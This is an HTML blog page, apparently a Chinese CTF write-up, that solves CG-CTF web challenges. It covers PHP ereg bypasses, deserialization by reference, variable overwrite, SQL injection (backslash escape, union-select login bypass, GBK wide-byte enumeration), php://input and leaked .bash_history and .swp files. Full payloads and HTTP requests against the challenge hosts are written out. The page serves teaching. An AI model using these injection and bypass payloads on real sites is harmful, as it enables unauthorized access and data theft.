@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：
+\0x00 考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）
+题目直接给源码：
+view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;} 这里ereg有两个漏洞：  ①%00截断及遇到%00则默认为字符串的结束
+②当ntf为数组时它的返回值不是FALSE
+法一：数组绕过index.php?nctf[]=#biubiubiu法二：\x00截断index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
+php 反序列化(暂时无法做) 考点：对象包含的引用在序列化时也会被存储
+题目源码：
+&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!'><title>CG-CTF_wp</title>
+
+<link rel='canonical' href='https://example.com/p/cg-ctf_wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CG-CTF_wp'>
+<meta property='og:description' content='cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：
+\0x00 考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）
+题目直接给源码：
+view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;} 这里ereg有两个漏洞：  ①%00截断及遇到%00则默认为字符串的结束
+②当ntf为数组时它的返回值不是FALSE
+法一：数组绕过index.php?nctf[]=#biubiubiu法二：\x00截断index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
+php 反序列化(暂时无法做) 考点：对象包含的引用在序列化时也会被存储
+题目源码：
+&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!'>
+<meta property='og:url' content='https://example.com/p/cg-ctf_wp/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="CG-CTF_wp">
+<meta name="twitter:description" content="cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：
+\0x00 考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）
+题目直接给源码：
+view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]&#43;$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;} 这里ereg有两个漏洞：  ①%00截断及遇到%00则默认为字符串的结束
+②当ntf为数组时它的返回值不是FALSE
+法一：数组绕过index.php?nctf[]=#biubiubiu法二：\x00截断index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
+php 反序列化(暂时无法做) 考点：对象包含的引用在序列化时也会被存储
+题目源码：
+&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://example.com" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/cg-ctf_wp/">CG-CTF_wp</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164539.jpeg" alt=""  /></p>
+<p>cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：</p>
+<h3 id="0x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp"><a class="link" href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php"  target="_blank" rel="noopener"
+    >\0x00</a></h3>
+<p>考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）</p>
+<p>题目直接给源码：</p>
+<pre><code>view-source:
+    if (isset ($_GET['nctf'])) {
+        if (@ereg (&quot;^[1-9]+$&quot;, $_GET['nctf']) === FALSE)
+            echo '必须输入数字才行';
+        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
+            die('Flag: '.$flag);
+        else
+            echo '骚年，继续努力吧啊~';
+    }
+</code></pre><ul>
+<li>这里ereg有两个漏洞：</li>
+</ul>
+<p>①%00截断及遇到%00则默认为字符串的结束</p>
+<p>②当ntf为数组时它的返回值不是FALSE</p>
+<pre><code>法一：数组绕过
+index.php?nctf[]=#biubiubiu
+法二：\x00截断
+index.php?nctf=1%00%23biubiubiu
+</code></pre><p>nctf{use_00_to_jieduan}</p>
+<h3 id="php-反序列化暂时无法做http4chinaloversinaappcomweb25indexphp"><a class="link" href="http://4.chinalover.sinaapp.com/web25/index.php"  target="_blank" rel="noopener"
+    >php 反序列化(暂时无法做)</a></h3>
+<p>考点：对象包含的引用在序列化时也会被存储</p>
+<p>题目源码：</p>
+<pre><code>&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+if (isset($_GET['pass'])) {
+    $pass = $_GET['pass'];
+    
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+    
+    $o = unserialize($pass);
+    
+    if ($o) {
+        $o-&gt;secret = &quot;*&quot;;
+        if ($o-&gt;secret === $o-&gt;enter)
+            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
+        else 
+            echo &quot;Oh no... You can't fool me&quot;;
+    }
+    else echo &quot;are you trolling?&quot;;
+?&gt;
+</code></pre><p>反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。</p>
+<ul>
+<li>对象包含的引用在序列化时也会被存储</li>
+</ul>
+<p>编写脚本：</p>
+<pre><code>&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+$a= new just4fun;
+
+$a-&gt;enter=&amp;$a-&gt;secret;
+
+echo serialize($a);
+?&gt;
+</code></pre><p>执行得到：</p>
+<pre><code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}
+</code></pre><p>GET传值过去：</p>
+<pre><code>http://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}
+</code></pre><p>得到：</p>
+<pre><code>Congratulation! Here is my secret: thisisnctfsecret
+</code></pre><h3 id="变量覆盖httpchinaloversinaappcomweb18"><a class="link" href="http://chinalover.sinaapp.com/web18/"  target="_blank" rel="noopener"
+    >变量覆盖</a></h3>
+<p>考点：变量覆盖漏洞</p>
+<p>题目关键部分源码：</p>
+<pre><code>&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
+                        &lt;?php
+                        extract($_POST);
+                        if ($pass == $thepassword_123) { ?&gt;
+                            &lt;div class=&quot;alert alert-success&quot;&gt;
+                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
+                            &lt;/div&gt;
+                        &lt;?php } ?&gt;
+&lt;?php } ?&gt;
+</code></pre><p>整理为：</p>
+<pre><code>&lt;?php
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
+                        extract($_POST);
+                        if ($pass == $thepassword_123) {
+                             echo $theflag;
+                        }
+}
+
+?&gt;
+</code></pre><ul>
+<li>变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(), parse_str() 和 import_request_variables()</li>
+</ul>
+<p><strong>extract()变量覆盖</strong></p>
+<ul>
+<li><em>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</em></li>
+</ul>
+<pre><code>&lt;?php
+
+$auth = '0';
+extract($_GET)；
+
+if($auth==1){
+echo &quot;private!&quot;;
+}else{
+echo &quot;public!&quot;;
+}
+?&gt;
+</code></pre><p>假设用户构造以下链接：http://www.a.com/test1.php?auth=1</p>
+<p>则站点会输出“private！”</p>
+<p>所以playload是：（burp suite数据包）</p>
+<pre><code>POST /web18/ HTTP/1.1
+Host: chinalover.sinaapp.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Origin: http://chinalover.sinaapp.com
+Connection: close
+Referer: http://chinalover.sinaapp.com/web18/index.php
+Upgrade-Insecure-Requests: 1
+
+pass=1&amp;thepassword_123=1
+</code></pre><p>nctf{bian_liang_fu_gai!}</p>
+<h3 id="变量覆盖2httpchinaloversinaappcomweb24"><a class="link" href="http://chinalover.sinaapp.com/web24/"  target="_blank" rel="noopener"
+    >变量覆盖2</a></h3>
+<p>考点：遍历初始化变量导致变量覆盖</p>
+<p>题目源码：</p>
+<pre><code>&lt;!--
+foreach($_GET as $key =&gt; $value){  
+        $$key = $value;  
+}  
+if($name == &quot;meizijiu233&quot;){
+    echo $flag;
+}
+--&gt;
+</code></pre><p>（详见本站“<a class="link" href="http://wh1sper.com/%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e6%bc%8f%e6%b4%9e%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/"  target="_blank" rel="noopener"
+    >变量覆盖漏洞学习笔记</a>”）</p>
+<p>playload:</p>
+<pre><code>chinalover.sinaapp.com/web24/?name=meizijiu233
+</code></pre><p>nctf{AD3FBD8D5928693CA499347C91570AE6}</p>
+<h3 id="sql-injectionhttpchinaloversinaappcomweb15indexphp"><a class="link" href="http://chinalover.sinaapp.com/web15/index.php"  target="_blank" rel="noopener"
+    >SQL Injection</a></h3>
+<p>知识点：PHP代码审计，sql语言基础，\转义单引号</p>
+<p>题目：</p>
+<pre><code>&lt;!--
+#GOAL: login as admin,then get the flag;
+error_reporting(0);
+require 'db.inc.php';
+
+function clean($str){
+	if(get_magic_quotes_gpc()){
+		$str=stripslashes($str);
+	}
+	return htmlentities($str, ENT_QUOTES);
+}
+
+$username = @clean((string)$_GET['username']);
+$password = @clean((string)$_GET['password']);
+
+$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1){
+	die('Invalid password!');
+}
+
+echo $flag;
+--&gt;
+Invalid password!
+</code></pre><ul>
+<li>代码中clean()函数去掉转义，htmlentities($str, ENT_QUOTES)会转换单引号和双引号。这里我们只能通过<strong>引入反斜杠</strong>，<strong>转义原有的单引号</strong>，改变原sql语句的逻辑，导致sql注入。</li>
+</ul>
+<p>payload如下：</p>
+<pre><code>?username=\&amp;password= or 1#//要urlcode编码一下，不然#会被浏览器当作空字符
+</code></pre><p>于是sql查询语句为：</p>
+<pre><code>SELECT * FROM users WHERE
+name='\' AND pass='            //此时，\'已被转义为一个字符，不会起到引号的作用
+or 1
+#'
+</code></pre><p>flag:nctf{sql_injection_is_interesting}</p>
+<h3 id="sql注入2http4chinaloversinaappcomweb6indexphp"><a class="link" href="http://4.chinalover.sinaapp.com/web6/index.php"  target="_blank" rel="noopener"
+    >SQL注入2</a></h3>
+<p>考点：union查询，union查询的时候，返回的结果的列名个第一条查询语句是相同的</p>
+<h4 id="sql-union-语法">SQL UNION 语法</h4>
+<pre><code>SELECT column_name(s) FROM table_name1
+UNION
+SELECT column_name(s) FROM table_name2
+</code></pre><p>如果要查询重复的值，可以使用 UNION ALL：</p>
+<pre><code>SELECT column_name(s) FROM table_name1
+UNION ALL
+SELECT column_name(s) FROM table_name2
+</code></pre><h4 id="实例">实例</h4>
+<p>列出所有在中国和美国的不同的雇员名：</p>
+<pre><code>SELECT E_Name FROM Employees_China
+UNION
+SELECT E_Name FROM Employees_USA
+</code></pre><h4 id="结果">结果</h4>
+<table>
+<thead>
+<tr>
+<th>E_Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Zhang, Hua</td>
+</tr>
+<tr>
+<td>Wang, Wei</td>
+</tr>
+<tr>
+<td>Carter, Thomas</td>
+</tr>
+<tr>
+<td>Yang, Ming</td>
+</tr>
+<tr>
+<td>Adams, John</td>
+</tr>
+<tr>
+<td>Bush, George</td>
+</tr>
+<tr>
+<td>Gates, Bill</td>
+</tr>
+</tbody>
+</table>
+<p>注意：</p>
+<ul>
+<li>union查询必须和第一句查询语句查询列数相同，不然会出现错误；</li>
+<li>union查询的时候，返回的结果的列名个第一条查询语句是相同的</li>
+<li>union第一条查询失败后会返回第二条的结果，但是列名还是第一条查询的列名</li>
+</ul>
+<p>此题正是用到了第三条知识点：</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+Secure Web Login II
+&lt;/head&gt;
+&lt;body&gt;
+ 
+&lt;?php
+if($_POST[user] &amp;&amp; $_POST[pass]) {
+   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = $_POST[user];
+  $pass = md5($_POST[pass]);
+  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user='$user'&quot;));
+  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
+      echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;;
+  }
+  else {
+    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
+  }
+}
+?&gt;
+ 
+ 
+&lt;form method=post action=index.php&gt;
+&lt;input type=text name=user value=&quot;Username&quot;&gt;
+&lt;input type=password name=pass value=&quot;Password&quot;&gt;
+&lt;input type=submit&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;
+&lt;/html&gt;
+</code></pre><p>意思是查询到的pw和输入的pw（经过md5加密后）相同，则输出flag；</p>
+<p>playload：</p>
+<pre><code>user=' union select md5(1)#
+pw=1
+</code></pre><p>查询结果其实是：</p>
+<table>
+<thead>
+<tr>
+<th>pw</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>md5（1）</td>
+</tr>
+</tbody>
+</table>
+<p>于是输入pw=1即可满足；</p>
+<p>nctf{union_select_is_wtf}</p>
+<h3 id="gbk-injectionhttpchinaloversinaappcomsql-gbkindexphpid1"><a class="link" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1"  target="_blank" rel="noopener"
+    >GBK Injection</a></h3>
+<p>知识点：</p>
+<p>宽字节注入：</p>
+<p>当传入的单引号会被反斜杠转义的时候，一般情况下是不存在sql注入漏洞的，但是有一个特例，那就是数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后面先加一个%df，再加单引号，因为<strong>反斜杠的编码为%5c</strong>，然而再GBK编码中，<strong>%df%5c是繁体字“謰”</strong>，所以这个时候，单引号就不会被反斜杠转义，造成注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164611.png" alt="img"  /></p>
+<p>输入%df之后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164617.png" alt="img"  /></p>
+<p>此时已经造成了注入；</p>
+<p>先使用order by语句查询出表中有多少列：</p>
+<pre><code>id=1%df%27+order+by+2%23   //不报错
+id=1%df%27+order+by+3%23   //报错，判断列数为2
+</code></pre><p>或者使用union查询：</p>
+<pre><code>id=1%df%27+union+select+null,null%23          //不报错
+id=1%df%27+union+select+null,null,null%23     //报错，判断列数为2
+</code></pre><p>随后可将null换成查询语句，想要union查询到我们自己输入的语句，需要把1换成-1，</p>
+<p>因为单引号被过滤，所以我们可以使用嵌套查询：</p>
+<pre><code>-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23
+</code></pre><p>这句可以查到表名，但是只能插一个，想要查到其他的需要更改limit的值</p>
+<pre><code>-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23
+</code></pre><p>这句可以查到字段名；</p>
+<p>但是这道题我们不推荐这个嵌套查询的方法。</p>
+<p>有一个系统自带的函数：group_concat()（一般是CTF中常用的）:</p>
+<pre><code>id=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23
+</code></pre><p><img src="http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-7.png" alt="img"  /></p>
+<p>直接查到了所有表名；</p>
+<p>虽然单引号被过滤了，我们可以使用16进制绕过的方法：</p>
+<pre><code>id=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23
+</code></pre><p><img src="http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-8.png" alt="img"  /></p>
+<p>直接查到了news（0x6e657773）表中所有字段名；</p>
+<p>在这之后，可以把union中的null替换为查询语句</p>
+<p>select 字段名 from 表名</p>
+<pre><code>id=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23
+</code></pre><p>当然其他的表存在假的flag，这个才是真的；</p>
+<p>flag{this_is_sqli_flag}</p>
+<h3 id="file_get_contentshttpchinaloversinaappcomweb23"><a class="link" href="http://chinalover.sinaapp.com/web23/"  target="_blank" rel="noopener"
+    >file_get_contents</a></h3>
+<p>知识点：php://input访问POST请求的原始数据的只读流</p>
+<p>访问题目，查看源码：</p>
+<pre><code>&lt;!--$file = $_GET['file'];
+if(@file_get_contents($file) == &quot;meizijiu&quot;){
+    echo $nctf;
+}--&gt;
+</code></pre><p>这里使用PHP伪协议php://input访问未处理过的POST数据：</p>
+<p>burp suite发包：</p>
+<pre><code>POST /web23/?file=php://input HTTP/1.1
+Host: chinalover.sinaapp.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 8
+
+meizijiu
+</code></pre><p>可以直接得到flag：</p>
+<p>nctf{0b021b88527c69e5}</p>
+<h3 id="综合题httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp"><a class="link" href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php"  target="_blank" rel="noopener"
+    >综合题</a></h3>
+<p>考点：JSFuck、命令记录文件.bash_history</p>
+<p>打开题目是一串的JSFuck：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164630.png" alt="img"  /></p>
+<p>直接复制到F12里面的控制台运行，得到：</p>
+<pre><code>1bc29b36f623ba82aaf6724fd3b16718.php
+</code></pre><p>直接访问这个页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164641.png" alt="img"  /></p>
+<p>这里是一个脑洞，</p>
+<p>其实他说TIP在他脑袋里，其实就是“head”，暗示了<strong>HTTP头</strong>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164649.png" alt="img"  /></p>
+<pre><code>tip: history of bash
+</code></pre><h4 id="linux的-用户目录下三个bash文件的作用httpsblogcsdnnetu011479200articledetails86501366"><a class="link" href="https://blog.csdn.net/u011479200/article/details/86501366"  target="_blank" rel="noopener"
+    >Linux的 用户目录下三个bash文件的作用:</a></h4>
+<p>(.bash_history,.bash_logout,.bash_profile,.bashrc)</p>
+<p>这里就只说.bash_history:</p>
+<ul>
+<li>Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</li>
+</ul>
+<p>于是我们访问.bash_history这个文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164701.png" alt="img"  /></p>
+<p>我们继续访问flagbak.zip，就能直接下载这个文件，解压打开就是flag：</p>
+<p>nctf{bash_history_means_what}</p>
+<h3 id="heading"></h3>
+<h3 id="密码重置2httpnctfnuptzjcnweb14"><a class="link" href="http://nctf.nuptzj.cn/web14/"  target="_blank" rel="noopener"
+    >密码重置2</a></h3>
+<p>考点：Linux下vi编辑器退出后留下的备份文件、弱类型比较</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164708.png" alt="img"  /></p>
+<p>查看源码中可以找到admin的邮箱，随意舔一个token后提交得到一个提示fail的页面；</p>
+<p>根据题干的提示，这个是用Linux下vi编辑器编辑的；</p>
+<ul>
+<li>当非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。</li>
+<li>需要注意的是如果你并没有对文件进行修改，而<strong>只是读取文件，是不会产生.swp文件的</strong>。</li>
+<li>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。</li>
+<li>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。</li>
+</ul>
+<p>参考：https://blog.csdn.net/qq_35405259/article/details/86476663</p>
+<p>于是我们可以去访问</p>
+<pre><code>http://nctf.nuptzj.cn/web14/.submit.php.swp   //submit前面一定有一个&quot;.&quot;
+</code></pre><p>可以得到submit页面的源码，其中关键部分是：</p>
+<pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){
+	if(strlen($token)!=10) die('fail');
+	if($token!='0') die('fail');
+	$sql = &quot;SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'&quot;;
+	$r = mysql_query($sql) or die('db error');
+	$r = mysql_fetch_assoc($r);
+	$r = $r['num'];
+	if($r&gt;0){
+		echo $flag;
+	}else{
+		echo &quot;失败了呀&quot;;
+	}
+}
+</code></pre><p>第2、3行弱类型比较，我们只需要输入token=0000000000（10个）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164715.png" alt="img"  /></p>
+<p>nctf{thanks_to_cumt_bxs}</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
